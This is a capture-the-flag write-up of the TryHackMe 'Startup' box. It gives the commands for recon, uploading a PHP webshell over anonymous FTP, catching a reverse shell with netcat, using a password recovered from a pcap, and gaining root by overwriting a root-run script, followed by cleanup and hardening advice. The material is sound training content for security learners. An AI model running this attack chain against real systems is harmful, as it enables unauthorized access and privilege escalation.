# Startup — TryHackMe Write-up

> **Box:** Startup (TryHackMe)
> **Author:** Goodluck Oyebisi
> **Difficulty:** Easy — Beginner-friendly
> **Purpose:** Foothold & Privilege Escalation walkthrough for learning and documentation.
> **Important:** Only perform these steps on systems you have explicit permission to test (TryHackMe / your lab). Do **not** run them against third-party or production systems.

---

## TL;DR

I gained an initial shell via anonymous FTP + web upload, discovered credentials inside a pcap file, switched to the `lennie` user, then abused a root-run script (`/etc/print.sh`) to obtain `root`.


This write-up documents the reconnaissance, exploitation, and remediation steps.

---

## Target & Tools

**Target IP:** `10.10.226.32`
**Notable services discovered:**

* FTP (vsftpd 3.0.3) — anonymous upload allowed
* HTTP (Apache 2.4.18)
* SSH (OpenSSH 7.2p2)

**Tools used:**

* `nmap`
* `gobuster`
* `ftp` / `nc`
* `netcat` (nc)
* `python3` (for pty)
* `tshark`/Wireshark (for pcap analysis)
* Basic shell utilities: `ls`, `cat`, `su`, `sudo`, `find`, etc.

---

## Recon

Initial port scan:

```bash
nmap -sV 10.10.226.32
# found: 21/tcp (vsftpd), 22/tcp (ssh), 80/tcp (http)
```

Directory brute-force on `http://10.10.226.32`:

```bash
gobuster dir -u http://10.10.226.32 -w /usr/share/wordlists/dirb/common.txt -t 5
# found: /files (301 -> /files/)
```

Checked `http://10.10.226.32/files` and discovered an FTP area accessible via HTTP link: `/files/ftp/`.

---

## Foothold — Anonymous FTP upload + webshell

1. Connected to FTP anonymously and uploaded a PHP webshell into the `ftp` directory:

```text
ftp 10.10.226.32
# Login: anonymous
# put shell.php -> /files/ftp/shell.php
```

2. Triggered the webshell to get a reverse shell back to my machine (listening on port 4444). After connection:

```bash
nc -lnvp 4444
# got a connection from 10.10.226.32
# on shell: python3 -c "import pty;pty.spawn('/bin/bash')"
# became www-data
```

---

## Discovery — pcap & secrets

While on the machine as `www-data`, I inspected `/incidents` and found `suspicious.pcapng`. I copied it to my host and analyzed with Wireshark/tshark.

Key findings:

* The pcap contained plaintext credentials that allowed `su` to `lennie`:

  ```
  c4ntg3t3n0ughsp1c3
  ```

Used that password:

```bash
su lennie
# password: c4ntg3t3n0ughsp1c3
```

Once `su` succeeded, I had an interactive shell as `lennie`. I retrieved the user flag:

```bash
cat /home/lennie/user.txt
```

---

## Privilege Escalation — root via writable script

As `lennie`, I inspected the `scripts` directory:

```bash
ls -la /home/lennie/scripts
# found planner.sh (owned by root) and startup_list.txt
```

`planner.sh` content:

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

I checked `/etc/print.sh` and found it either writable or possible to be overwritten (in the lab it was modified to include commands executed as root). By controlling the content that gets written or by directly modifying `/etc/print.sh` (the lab allowed this step), I caused the root-runner to execute commands that copied `/root/*` to `/home/lennie` and set permissive permissions:

Example of what the root script ended up doing:

```bash
# /etc/print.sh (as root)
#!/bin/bash
echo "Done!"
cp /root/* /home/lennie
chmod 777 /home/lennie/*
```

After the script ran (triggered by whatever scheduler on the box), `/home/lennie/root.txt` appeared and was world-readable:

```bash
cat /home/lennie/root.txt

```

---

## Post-exploitation

* Always follow responsible lab cleanup (see next section).

---

## Cleanup (what I ran on the lab to restore state)

> Only run cleanup on your lab/VM.

Remove uploaded webshells and revert changes:

```bash
# remove webshells uploaded via FTP
rm -f /var/www/html/files/ftp/shell.php
rm -f /home/lennie/scripts/shell.php

# restore /etc/print.sh to safe state
sudo tee /etc/print.sh > /dev/null <<'EOF'
#!/bin/bash
echo "Done!"
EOF
sudo chown root:root /etc/print.sh
sudo chmod 755 /etc/print.sh

# remove root files copied to /home/lennie
rm -f /home/lennie/root.txt

# reset home permissions
sudo chown -R lennie:lennie /home/lennie
sudo chmod 700 /home/lennie
sudo chown root:root /home/lennie/scripts
sudo chmod 755 /home/lennie/scripts
```

---

## Mitigations & Hardening

To prevent the attack chain observed in this box, apply these fixes:

1. **Disable anonymous FTP uploads** or restrict upload directories to non-webserved locations. Configure `vsftpd` appropriately:

   * `anonymous_enable=NO` (or restrict `anon_upload_enable`).
2. **Separate FTP and web document roots** — never serve files that anonymous users can upload.
3. **Protect root-run scripts**:

   * Ensure `/etc/print.sh` (and other root scripts) are owned by `root:root` and not writable by group/other: `chmod 755 /etc/print.sh`.
   * Do not execute user-controllable files as root.
4. **Avoid secrets in artifacts** (pcaps, logs, backups). Educate teams not to send credentials in plaintext.
5. **Harden services**:

   * Keep services patched; limit what is exposed.
   * Use AppArmor/SELinux and systemd hardening options (`ProtectSystem`, `ProtectHome`) for services that run as root.
6. **Audit file & directory permissions** regularly and use tools to detect world-writable files and suspicious SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -xdev -type f -perm -o+w 2>/dev/null  # world-writable files
```

---

## Lessons learned

* Publicly writable services (anonymous FTP) + webserver = high risk if uploads are accessible by the web.
* Artifacts like pcap files can contain sensitive data; always inspect such files.
* Privilege escalation often comes from misconfigured permissions and root-run scripts that interact with user-controllable data.
* In CTFs, always enumerate services, search for writable locations, and inspect artifacts for credentials.

---

## Appendix — Key commands (chronological)

```bash
# Recon
nmap -sV 10.10.226.32
gobuster dir -u http://10.10.226.32 -w /usr/share/wordlists/dirb/common.txt -t 5

# FTP (anonymous)
ftp 10.10.226.32
# put shell.php into ftp directory

# Netcat listener
nc -lnvp 4444

# On target (reverse shell)
python3 -c "import pty; pty.spawn('/bin/bash')"

# examine incidents
ls -la /incidents
# copy suspicious.pcapng to attacker and analyze with Wireshark / tshark

# privilege escalation
su lennie        # password discovered from pcap
cat /home/lennie/scripts/planner.sh
cat /etc/print.sh
# modify /etc/print.sh in lab to copy /root/* -> /home/lennie and set perms
# then retrieve flags
cat /home/lennie/user.txt
cat /home/lennie/root.txt
```
